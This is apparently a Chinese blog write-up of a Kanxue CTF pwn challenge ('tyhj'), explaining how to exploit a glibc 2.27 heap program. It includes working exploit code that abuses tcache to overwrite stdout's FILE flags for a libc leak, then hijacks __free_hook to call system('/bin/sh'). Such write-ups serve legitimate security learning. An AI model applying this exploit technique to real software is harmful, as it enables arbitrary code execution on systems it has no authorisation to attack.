---
layout: post
title: The ends of the earth
date: 2020-05-19 00:01:00 +0300
description: The ends of the earth
img: ./tyhj/06.jpeg # Add image post (optional)
tags: [归档] # add tag
---
***

### <font color=0066FF>序言</font>

<font color=green>"天涯海角" 一在天之涯,一在地之角. 实话说我并没有弄明白为什么要叫这个名字(tyhj) 但重要的是可以学到一些"姿势"和"技巧"! 这里要介绍的是看雪CTF的一道PWN题目，主要介绍解题的思路过程：tyhj</font>

### <font color=0066FF>题目分析</font>
题目线索：我们有一个ELF文件,已知libc版本为2.27 正好我有Docker系统也是libc2.27版本.

<strong>file ./tyhj</strong>
```
kig@kig-Inspiron-7370:~/Docker/ctf/kanxue$ file tyhj
tyhj: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=340a44173cd2c079228c4207d1caa9b56a61407e, not stripped
```

检查一下系统保护的情况<strong>checksec ./tyhj</strong>
``` 
[*] pwndbg> checksec
	Arch:     amd64-64-little
	RELRO:	  Full RELRO
	STACK:	  Canary found
	NX:		  enabled
	PIE:	  enabled
	FILE:	  /home/kig/Docker/ctf/kanxue/tyhj
```
<strong>系统保护机制全开,看到这种情况总是莫名的紧张和兴奋. </strong>
![image](/assets/img/tyhj/00.png){:width="1400px"}
很经典的一段代码,初始化buffer,一个很经典的menu菜单,非常简单的功能. 有三个关键的功能<font color=red>new,edit,delete</font>,很容易使我们猜测到这是利用heap漏洞相关的. 我们需要进一步分析...

在<font color=red>alloc</font>功能中发现对new malloc的数量限制为3:
```
pwndbg> disassemble alloc
Dump of assembler code for function alloc:
0x0000000000000b22 <+0>:	push   rbp
   0x0000000000000b23 <+1>:	mov    rbp,rsp
   0x0000000000000b26 <+4>:	sub    rsp,0x10
   0x0000000000000b2a <+8>:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000000b31 <+15>:	jmp    0xb54 <alloc+50>
   0x0000000000000b33 <+17>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000b36 <+20>:	cdqe
   0x0000000000000b38 <+22>:	lea    rdx,[rax*8+0x0]
   0x0000000000000b40 <+30>:	lea    rax,[rip+0x201509]        # 0x202050 <notes>这里是一个notes数组用来存放chunk的指针，数组的大小为3
   0x0000000000000b47 <+37>:	mov    rax,QWORD PTR [rdx+rax*1]
   0x0000000000000b4b <+41>:	test   rax,rax
   0x0000000000000b4e <+44>:	je     0xb5c <alloc+58>
   0x0000000000000b50 <+46>:	add    DWORD PTR [rbp-0x4],0x1
   0x0000000000000b54 <+50>:	cmp    DWORD PTR [rbp-0x4],0x2
   0x0000000000000b58 <+54>:	jle    0xb33 <alloc+17>
   0x0000000000000b5a <+56>:	jmp    0xb5d <alloc+59>

```

继续分析<font color=red>edit</font>和<font color=red>del</font>功能. 通过上面的notes[3]对new malloc数量的限制, 这使得heap的利用难度增加,这也使得我利用<font color=red>Fastbin corruption</font>的想法直接打消. 从另一方面我们又看到这个程序非常的"短小", <strong>没有太多的"功能"可以需找漏洞利用点,我们没有缓冲区溢出,没有format string,而且系统保护enabled...没有发现任何除heap之外的可利用点</strong> 这是一种非常不利的情况, 程序是64位的, 爆破的可能性基本不存在...:
![image](/assets/img/tyhj/01.png){:width="1400px"}
![image](/assets/img/tyhj/02.png){:width="1400px"}

这使我陷入窘境一段时间,我没有了思路! 我找到一个墙角默默的反思了一下自己,十分钟后...当我再次尝试解决问题时,我发现了这个:
```
pwndbg> p stdout
$1 = (FILE *) 0x7ffff7fab6a0 <_IO_2_1_stdout_>
pwndbg> ptype stdout
type = struct _IO_FILE {
    int _flags;
    char *_IO_read_ptr;
    char *_IO_read_end;
    char *_IO_read_base;
    char *_IO_write_base;
    char *_IO_write_ptr;
    char *_IO_write_end;
    char *_IO_buf_base;
    char *_IO_buf_end;
    char *_IO_save_base;
    char *_IO_backup_base;
    char *_IO_save_end;
    struct _IO_marker *_markers;
    struct _IO_FILE *_chain;
    int _fileno;
    int _flags2;
    __off_t _old_offset;
    unsigned short _cur_column;
    signed char _vtable_offset;
    char _shortbuf[1];
    _IO_lock_t *_lock;
    __off64_t _offset;
    struct _IO_codecvt *_codecvt;
    struct _IO_wide_data *_wide_data;
    struct _IO_FILE *_freeres_list;
    void *_freeres_buf;
    size_t __pad5;
    int _mode;
    char _unused2[20];
} *
pwndbg>
```
我查看了 <font color=red><strong>FILE</strong></font> 的结构体信息. 这里有一种泄露信息的机制<font color=red>_IO_2_1_stdout_</font><br>
对于一个<font color=red>FILE</font>结构体来说，最重要的元素就是<font color=red>_flags</font>和<font color=red>_fileno</font>，<font color=red>_fileno</font>存储的是我们的文件描述符，对于某些情况或许我们要劫持<font color=red>_fileno</font>才能达到我们的目的，而<font color=red>_flags</font>.则标志了该FILE的一些行为，这对于我们的泄露至关重要。<br>
简单的说明一下<font color=red>_flags</font>的规则，<font color=red>_flags</font>的高两位字节，这是由 <font color=red>libc</font>固定的，不同的 libc 或许不同，但是大体相同，这就像一个文件的头标示符一样，标志这是一个什么文件，正如注释所说<font color=red>High-order word is _IO_MAGIC; rest is flags</font>.，而低两位字节的位数规则可以参考下面代码，不同位的功能，在注中已经标明。
```
#define _IO_MAGIC 0xFBAD0000 /* Magic number */
#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */
#define _IO_MAGIC_MASK 0xFFFF0000
#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */
#define _IO_UNBUFFERED 2
#define _IO_NO_READS 4 /* Reading not allowed */
#define _IO_NO_WRITES 8 /* Writing not allowd */
#define _IO_EOF_SEEN 0x10
#define _IO_ERR_SEEN 0x20
#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */
#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/
#define _IO_IN_BACKUP 0x100
#define _IO_LINE_BUF 0x200
#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */
#define _IO_CURRENTLY_PUTTING 0x800
#define _IO_IS_APPENDING 0x1000
#define _IO_IS_FILEBUF 0x2000
#define _IO_BAD_SEEN 0x4000
#define _IO_USER_LOCK 0x8000
```
<br><font color=red>_IO_2_1_stdout_</font>一般是这样的：
```_IO_MAGIC|_IO_IS_FILEBUF|_IO_CURRENTLY_PUTTING|_IO_LINKED|_IO_NO_READS | _IO_UNBUFFERED |_IO_USER_BUF```

由于我们的程序开启了PIE, 所以需要尝试爆破4个bits.<br>
<strong>跟进调试：</strong> puts内部：<font color=red> _IO_puts -> _IO_new_file_esputn -> _IO_new_file_overflow -> _IO_do_write -> _IO_new_file_write</font>,
整个程序的功能非常简单：<font color=red>main --> [init_buffering()，ropnop()，read()]</font><br>
这里我们可以通过对<font color=red>_flag</font>的构造满足一定的利用条件，具体的代码分析就不过多赘述，有兴趣的请自行google, 其实关键就是在绕过<font color=red>_IO_new_file_overflow</font>函数中<font color=red>f_size = f ->_IO_write_ptr - f->_IO_write_base =0</font>，当<strong>f_size不等于0的时候就会打印出<font color=red>f->_IO_write_base</font>上面的东西，所以这里可以造成泄露libc。</strong>而我们要做的就是想办法覆盖<font color=red>flag</font>和<font color=red>_IO_write_base</font>的pointer。针对这里的pwn我的构造：
```
free(1,'n')
edit(2,p64(0)+p64(0x51))
free(0,'y')
edit(2,p64(0)+p64(0x91))
free(1,'y')
[b]# 通过fd覆盖flags     _IO_2_1_stdout_[/b]
edit(2,p64(0)+p64(0x51)+p16(0x7760))
add("aaaa")
raw_input(":")
# Modify the flag and the write pointers
add(p64(0xfbad3c80)+p64(0)*3+p8(0))
```
<strong>这里我使用gdb进行了测试:</strong>
![image](/assets/img/tyhj/03.png){:width="1400px"}

回想一下我们的程序想办法做一些构建，由于我们的程序有<font color=red>new malloc</font>数量的限制，并且默认<font color=red>malloc</font>大小为<strong>0x40</strong>, 我们pwn题目给出的glibc版本是<strong>2.27.0</strong>, 大体的利用思路是使<font color=red>unsortedbin</font>的<font color=red>fd</font>和<font color=red>tcache</font>对<font color=red>__free_hook</font>进行劫持,泄露<strong>base libc</strong>:
```
add(p64(0xfbad3c80)+p64(0)*3+p8(0))
p.recv(8)
libc=ELF('./libc-2.27.so')
raddr=u64(p.recv(6).ljust(8,'\x00'))
libc_addr=raddr-0x3ed8b0
libc.address=libc_addr
```
![image](/assets/img/tyhj/04.png){:width="1400px"}
<font color=red><strong>CORRUPTED!</strong></font>

```
p.recvuntil("Done")
free(0,'y')
edit(2,p64(0)+p64(0x51)+p64(libc.symbols['__free_hook']))
add("123")
edit(2,p64(0)+p64(0x61)+p64(libc.symbols['__free_hook']))
free(0,'y')
add(p64(libc.symbols['system']))
edit(2,'/bin/sh\x00')
raw_input(":")
free(2)
p.interactive()
```
![image](/assets/img/tyhj/05.png){:width="1400px"}

